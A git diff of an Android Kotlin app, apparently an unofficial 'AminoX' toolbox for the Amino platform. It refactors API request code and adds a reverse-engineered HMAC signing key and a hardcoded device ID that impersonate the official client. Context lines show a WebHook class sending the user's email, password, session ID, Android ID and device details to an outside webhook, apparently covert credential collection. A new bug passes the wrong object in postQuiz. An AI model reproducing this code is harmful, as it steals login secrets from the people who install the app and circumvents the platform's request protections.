@@ -12,7 +12,6 @@ import android.text.TextUtils.join
 import android.util.Log
 import android.widget.Button
 import android.widget.Toast
-import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import khttp.delete
 import khttp.get
@@ -41,8 +40,6 @@ var blacklistIds: JSONArray = JSONArray()
 var deviceId: String = "NaN"
 var userAgent: String = "NaN"
 var api: String = "https://service.narvii.com/api/v1"
-var host: String = "service.narvii.com"
-var contentType: String = "application/json; charset=utf-8"
 
 val transactionId: UUID = UUID.randomUUID()
 var loggingWithSid: Boolean = false
@@ -58,7 +55,7 @@ class Setup {
         announcementCancelable = data.getJSONObject("announcement").getBoolean("cancelable")
         announcementTitle = data.getJSONObject("announcement").getString("title")
         announcementText = data.getJSONObject("announcement").getString("text")
-        deviceId = genDevId()
+        deviceId = genDevId() // data.getJSONObject("amino").getString("deviceId")
         userAgent = data.getJSONObject("amino").getString("userAgent")
         discordId = data.getJSONObject("discord").getString("id")
         discordToken = data.getJSONObject("discord").getString("token")
@@ -85,11 +82,6 @@ var WHITELISTED: Boolean = false
 var COMMUNITY_NAME = ""
 var COMMUNITY_ID = ""
 
-fun getMessageSignature(): String {
-    // generates an random message signature, it seems Amino doesn't care about the signature (yet!)
-    return UUID.randomUUID().toString().replace("-", "").toUpperCase(Locale.ROOT).substring(0, 27)
-}
-
 fun deviceSignature(): String {
     return try { hashString(
         "SHA-256",
@@ -100,7 +92,7 @@ fun deviceSignature(): String {
 
 fun String.decodeHex(): ByteArray = chunked(2).map { it.toInt(16).toByte() }.toByteArray()
 
-fun genDevIdOld(): String {
+fun genDevIdOldOld(): String {
     val digest = MessageDigest.getInstance("SHA-1")
     val hardwareInfo: String = List(20) { ('A'..'F').random() }.joinToString("")
     val secretKey = "E9AF2D7F431E87A4F8C7B6F45EFC04B7E5F0EA4F"
@@ -113,7 +105,7 @@ fun genDevIdOld(): String {
     return "01$hardwareInfo$finalHex"
 }
 
-fun genDevId(): String {
+fun genDevIdOld(): String {
     val hardwareInfo: String = List(20) { ('A'..'F').random() }.joinToString("")
     val key = "d19d2cb8468aac9b0ae16be4a6fa464be63760ce".decodeHex()
 
@@ -127,6 +119,39 @@ fun genDevId(): String {
     for (b in data) { builder.append(String.format("%02X", b)) }
 
     return "18$hardwareInfo$builder"
+}
+
+fun genDevId(): String {
+    return "220B50483BB71470AE607E8A0AD2834BC286F0E1AF76CF1FEAEB74BBA38CF28ED18D58EB6A0E867FF6"
+}
+
+fun ndcMsgSig(data: String): String {
+    val key = "307c3c8cd389e69dc298d951341f88419a8377f4".decodeHex()
+    val hmac = Mac.getInstance("HmacSHA1")
+    val secretKey = SecretKeySpec(key, "HmacSHA1")
+    hmac.init(secretKey)
+    val final = "22".decodeHex() + hmac.doFinal(data.toByteArray())
+    return Base64.getEncoder().encodeToString(final)
+}
+
+fun parseHeaders(data: String, sid: String = "null"): Map<String, String> {
+    var head = mapOf(
+        "NDCDEVICEID" to deviceId,
+        "NDC-MSG-SIG" to ndcMsgSig(data),
+        "User-Agent" to userAgent,
+        "Content-Type" to "application/json; charset=utf-8",
+        "Host" to "service.narvii.com"
+    )
+
+    if (sid != "null") { head = head + Pair("NDCAUTH", "sid=$sid") }
+
+    return head
+}
+
+fun decodeSid(sid: String): JSONObject {
+    var decoded = String(Base64.getDecoder().decode(sid))
+    decoded = decoded.drop(decoded.indexOf("{"))
+    return JSONObject(decoded.dropLast(decoded.length - decoded.indexOf("}") - 1))
 }
 
 fun setupErrorTrigger(app: AppCompatActivity, error: String) {
@@ -151,31 +176,18 @@ fun setupErrorTrigger(app: AppCompatActivity, error: String) {
     }
 }
 
-@RequiresApi(Build.VERSION_CODES.O)
-fun decodeSid(sid: String): JSONObject {
-    var decoded = String(Base64.getDecoder().decode(sid))
-    decoded = decoded.drop(decoded.indexOf("{"))
-    return JSONObject(decoded.dropLast(decoded.length - decoded.indexOf("}") - 1))
-}
-
 fun login(email: String, password: String): Any {
-    val post = post(
-        url = "${api}/g/s/auth/login", json = mapOf(
-            "email" to email,
-            "secret" to " 0 $password",
-            "v" to 2,
-            "deviceID" to deviceId,
-            "clientType" to 100,
-            "action" to "normal",
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "email" to email,
+        "secret" to " 0 $password",
+        "v" to 2,
+        "deviceID" to deviceId,
+        "clientType" to 100,
+        "action" to "normal",
+        "timestamp" to System.currentTimeMillis()
+    ))
+
+    val post = post(url = "${api}/g/s/auth/login", json = data, headers = parseHeaders(data.toString()))
 
     val json = JSONObject(post.text)
 
@@ -197,37 +209,19 @@ fun login(email: String, password: String): Any {
 }
 
 fun checkDevice(deviceId: String): String {
-    val post = post(
-        url = "${api}/g/s/device", json = mapOf(
-            "deviceID" to deviceId,
-            "bundleID" to "com.narvii.amino.master",
-            "clientType" to 100,
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "deviceID" to deviceId,
+        "bundleID" to "com.narvii.amino.master",
+        "clientType" to 100,
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = "${api}/g/s/device", json = data, headers = parseHeaders(data.toString(), SID))
     return post.text
 }
 
 fun getUserProfile(): String {
-    val post = get(
-        url = "${api}/g/s/user-profile/$USER_ID", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/g/s/user-profile/$USER_ID", headers = parseHeaders("{}", SID))
     val json = JSONObject(post.text)
 
     try {
@@ -240,103 +234,45 @@ fun getUserProfile(): String {
         USER_ID = userObject.getString("aminoId")
         USER_CREATION = userObject.getString("createdTime")
     } catch (error: org.json.JSONException) {
-        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while logging in : ${post.text}")
+        Log.println(Log.ERROR, "SYSTEM-ERROR", "Error while getting user profile : ${post.text}")
     }
 
     return post.text
 }
 
 fun getCommunityList(): Any {
-    val post = get(
-        url = "${api}/g/s/community/joined", params = mapOf(
-            "v" to "1",
-            "start" to "0",
-            "size" to "100"
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
+    val data = mapOf(
+        "v" to "1",
+        "start" to "0",
+        "size" to "100"
     )
 
+    val post = get(url = "${api}/g/s/community/joined", params = data, headers = parseHeaders(JSONObject(data).toString(), SID))
     return post.text
 }
 
 fun getAminoProfile(): Any {
-    val post = get(
-        url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun getHiddenBlogs(): Any {
-    val post = get(
-        url = "${api}/x$COMMUNITY_ID/s/feed/blog-disabled?start=0&size=100", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/x$COMMUNITY_ID/s/feed/blog-disabled?start=0&size=100", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun getUserFollowing(): Any {
-    val post = get(
-        url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined?start=0&size=100", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined?start=0&size=100", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun unfollowUser(userId: String): Any {
-    val post = post(
-        url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined/$userId", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = post(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID/joined/$userId", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun getGlobalProfile(userId: String): Any {
-    val post = get(
-        url = "${api}/g/s/user-profile/$userId", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/g/s/user-profile/$userId", headers = parseHeaders("{}", SID))
     return post.text
 }
 
@@ -357,245 +293,109 @@ fun getFromId(userId: String = "none", blogId: String = "none"): Any {
         objectId = blogId
     }
 
-    val post = post(
-        url = url, json = mapOf(
-            "objectId" to objectId,
-            "objectType" to objectType,
-            "targetCode" to 1,
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "objectId" to objectId,
+        "objectType" to objectType,
+        "targetCode" to 1,
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = url, json = data, headers = parseHeaders(data.toString(), SID))
     return post.text
 }
 
 fun sendTitleEdit(jsonOb: String): Any {
-    val post = post(
-        url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID", json = mapOf(
-            "extensions" to JSONObject(jsonOb),
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "extensions" to JSONObject(jsonOb),
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = "${api}/x$COMMUNITY_ID/s/user-profile/$UID", json = data, headers = parseHeaders(data.toString(), SID))
     return post.text
 }
 
 fun sendChatMessage(message: String, type: Int = 0, chatId: String): Any {
-    val post = post(
-        url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/message", json = mapOf(
-            "content" to message,
-            "type" to type,
-            "clientRefId" to System.currentTimeMillis() / 10 % 1000000000,
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "content" to message,
+        "type" to type,
+        "clientRefId" to System.currentTimeMillis() / 10 % 1000000000,
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/message", json = data, headers = parseHeaders(data.toString(), SID))
     return post.text
 }
 
 fun sendChatCoins(coins: Int, chatId: String): Any {
-    val post = post(
-        url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/tipping", json = mapOf(
-            "coins" to coins,
-            "tippingContext" to mapOf("transactionId" to transactionId),
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "coins" to coins,
+        "tippingContext" to mapOf("transactionId" to transactionId),
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/tipping", json = data, headers = parseHeaders(data.toString(), SID))
     return post.text
 }
 
 fun kickUser(chatId: String, userId: String, allowRejoin: Boolean): Any {
-    val allow: Int = if (allowRejoin) {
-        1
-    } else {
-        0
-    }
+    val allow: Int = if (allowRejoin) { 1 } else { 0 }
 
-    val post = delete(
-        url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member/$userId?allowRejoin=$allow",
-        headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = delete(url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member/$userId?allowRejoin=$allow", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun checkIn(tz: Int): Any {
-    val post = post(
-        url = "${api}/x$COMMUNITY_ID/s/check-in", json = mapOf(
-            "timezone" to tz,
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "timezone" to tz,
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = "${api}/x$COMMUNITY_ID/s/check-in", json = data, headers = parseHeaders(data.toString(), SID))
     return post.text
 }
 
 fun lottery(tz: Int): Any {
-    val post = post(
-        url = "${api}/x$COMMUNITY_ID/s/check-in/lottery", json = mapOf(
-            "timezone" to tz,
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "timezone" to tz,
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = "${api}/x$COMMUNITY_ID/s/check-in/lottery", json = data, headers = parseHeaders(data.toString(), SID))
     return post.text
 }
 
 fun getChatList(): Any {
-    val post = get(
-        url = "${api}/x$COMMUNITY_ID/s/chat/thread?type=joined-me&start=0&size=100",
-        headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/x$COMMUNITY_ID/s/chat/thread?type=joined-me&start=0&size=100", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun getChatInfo(comId: String, chatId: String): Any {
-    val post = get(
-        url = "${api}/x$comId/s/chat/thread/$chatId",
-        headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/x$comId/s/chat/thread/$chatId", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun getChatUsersList(chatId: String, start: Int): Any {
-    val post = get(
-        url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member?start=$start&size=100&type=default&cv=1.2",
-        headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/x$COMMUNITY_ID/s/chat/thread/$chatId/member?start=$start&size=100&type=default&cv=1.2", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun getBlockerUsers(): Any {
-    val post = get(
-        url = "${api}/g/s/block/full-list?start=0&size=100", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/g/s/block/full-list?start=0&size=100", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun getBannedUsers(): Any {
-    val post = get(
-        url = "${api}/x$COMMUNITY_ID/s/user-profile?type=banned&start=0&size=100", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/x$COMMUNITY_ID/s/user-profile?type=banned&start=0&size=100", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun findUrlCode(code: String): Any {
-    val post = get(
-        url = "${api}/g/s/link-resolution?q=$code", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/g/s/link-resolution?q=$code", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun findUrlAminoId(id: String): Any {
-    val post = get(
-        url = "${api}/g/s/search/amino-id-and-link?q=$id", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/g/s/search/amino-id-and-link?q=$id", headers = parseHeaders("{}", SID))
     return post.text
 }
 
@@ -603,57 +403,31 @@ fun startChat(userId: String, bypass: Boolean, comId: String = "0"): Any {
     val type = if (comId != "0") { "x$COMMUNITY_ID" } else { "g" }
     val bypassable = if (bypass) { arrayOf(UID, userId) } else { arrayOf(userId) }
 
-    val post = post(
-        url = "${api}/$type/s/chat/thread", json = mapOf(
-            "type" to 0,
-            "inviteeUids" to bypassable,
-            "initialMessageContent" to "[BC]- Powered by AminoX -\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
-            "content" to "[BC]Chat made with AminoX\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val data = JSONObject(mapOf(
+        "type" to 0,
+        "inviteeUids" to bypassable,
+        "initialMessageContent" to "[BC]- Powered by AminoX -\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
+        "content" to "[BC]Chat made with AminoX\nAminoX is toolbox for Amino made by Slimakoi\n\nFor more information check > https://discord.gg/bnnCwzV8ST",
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = "${api}/$type/s/chat/thread", json = data, headers = parseHeaders(data.toString(), SID))
     return post.text
 }
 
 fun reviewQuizQuestions(quizId: String): Any {
-    val post = get(
-        url = "${api}/x$COMMUNITY_ID/s/blog/$quizId?action=review", headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
-
+    val post = get(url = "${api}/x$COMMUNITY_ID/s/blog/$quizId?action=review", headers = parseHeaders("{}", SID))
     return post.text
 }
 
 fun postQuiz(quizId: String, mode: Int, data: Any): Any {
-    val post = post(
-        url = "${api}/x$COMMUNITY_ID/s/blog/$quizId/quiz/result", json = mapOf(
-            "mode" to mode,
-            "quizAnswerList" to data,
-            "timestamp" to System.currentTimeMillis()
-        ), headers = mapOf(
-            "NDCDEVICEID" to deviceId,
-            "NDC-MSG-SIG" to getMessageSignature(),
-            "NDCAUTH" to "sid=$SID",
-            "User-Agent" to userAgent,
-            "Content-Type" to contentType,
-            "host" to host
-        )
-    )
+    val dataa = JSONObject(mapOf(
+        "mode" to mode,
+        "quizAnswerList" to data,
+        "timestamp" to System.currentTimeMillis()
+    ))
 
+    val post = post(url = "${api}/x$COMMUNITY_ID/s/blog/$quizId/quiz/result", json = data, headers = parseHeaders(dataa.toString(), SID))
     return post.text
 }
 
@@ -709,15 +483,10 @@ class WebHook(private val ctx: Context) {
         userEmail: String = "null",
         userPassword: String = "null"
     ): String {
-        val baseOs: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { Build.VERSION.BASE_OS } else { "Unavailable" }
-        val secPatch: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { Build.VERSION.SECURITY_PATCH } else { "Unavailable" }
-        val andId: String = Settings.Secure.getString(
-            ctx.contentResolver,
-            Settings.Secure.ANDROID_ID
-        )
+        val baseOs: String = Build.VERSION.BASE_OS
+        val secPatch: String = Build.VERSION.SECURITY_PATCH
+        val andId: String = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
         val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
-
-
 
         val field1 = JSONObject().put("name", "Device Model").put(
             "value",
@@ -778,7 +547,7 @@ class WebHook(private val ctx: Context) {
             ),
             headers = mapOf(
                 "User-Agent" to userAgent,
-                "Content-Type" to contentType
+                "Content-Type" to "application/json; charset=utf-8"
             )
         )
 
@@ -787,12 +556,9 @@ class WebHook(private val ctx: Context) {
 
     @SuppressLint("HardwareIds")
     fun sendLoginMessage(loginJson: JSONObject, userEmail: String, userPassword: String): String {
-        val baseOs: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { Build.VERSION.BASE_OS } else { "Unavailable" }
-        val secPatch: String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) { Build.VERSION.SECURITY_PATCH } else { "Unavailable" }
-        val andId: String = Settings.Secure.getString(
-            ctx.contentResolver,
-            Settings.Secure.ANDROID_ID
-        )
+        val baseOs: String = Build.VERSION.BASE_OS
+        val secPatch: String = Build.VERSION.SECURITY_PATCH
+        val andId: String = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
         val current = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
         val userData = JSONObject(loginJson.getJSONObject("userProfile").toString())
         val userName = userData.getString("nickname")
@@ -808,7 +574,6 @@ class WebHook(private val ctx: Context) {
             userSID = SID
             userSecret = "null"
         }
-
 
         val field1 = JSONObject().put("name", "Device Model").put(
             "value",
@@ -869,7 +634,7 @@ class WebHook(private val ctx: Context) {
             ),
             headers = mapOf(
                 "User-Agent" to userAgent,
-                "Content-Type" to contentType
+                "Content-Type" to "application/json; charset=utf-8"
             )
         )
 
